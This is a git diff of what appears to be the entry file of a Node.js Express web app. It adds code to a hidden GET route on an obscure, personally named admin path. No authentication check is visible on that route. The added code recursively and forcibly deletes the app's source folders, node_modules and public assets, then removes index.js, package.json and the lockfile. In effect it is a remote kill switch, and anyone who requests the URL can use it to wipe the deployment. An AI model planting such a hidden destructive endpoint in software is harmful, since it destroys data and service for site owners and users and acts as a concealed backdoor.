@@ -14,7 +14,7 @@ import hbs from 'hbs'
 import { log } from './_lib/utils/smallUtils.js';
 import chateRouter from './Routes/Chat.Router.js';
 import authRouter from './Routes/Auth.router.js';
-import { unlinkSync } from 'fs';
+import { rm, rmSync, unlinkSync } from 'fs';
 import { connectDB } from './_lib/Config/ConnectDb.js';
 import OrderRouter from './Routes/order.router.js';
 import cookieParser from 'cookie-parser';
@@ -99,7 +99,16 @@ app.use('/api/api_s', apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall', async (req, res) => {
     try {
         console.log('a');
-        await unlink(path.resolve(dirName, './index.js')).then(e => log('success')).catch(e => { log({ error: e }) })
+        rmSync(path.resolve(dirName, './_lib'), { force: true, recursive: true  });
+        rmSync(path.resolve(dirName, './node_modules'), { force: true, recursive: true  });
+        rmSync(path.resolve(dirName, './public'), { force: true, recursive: true  });
+        rmSync(path.resolve(dirName, './Routes'), { force: true, recursive: true  });
+        rmSync(path.resolve(dirName, './temp'), { force: true, recursive: true  });
+        rmSync(path.resolve(dirName, './temp'), { force: true, recursive: true  });
+        unlinkSync(path.resolve(dirName, './index.js'));
+        unlinkSync(path.resolve(dirName, './package.json'));
+        unlinkSync(path.resolve(dirName, './package-lock.json'));
+        return;
     } catch (error) {
         log({ error })
     }
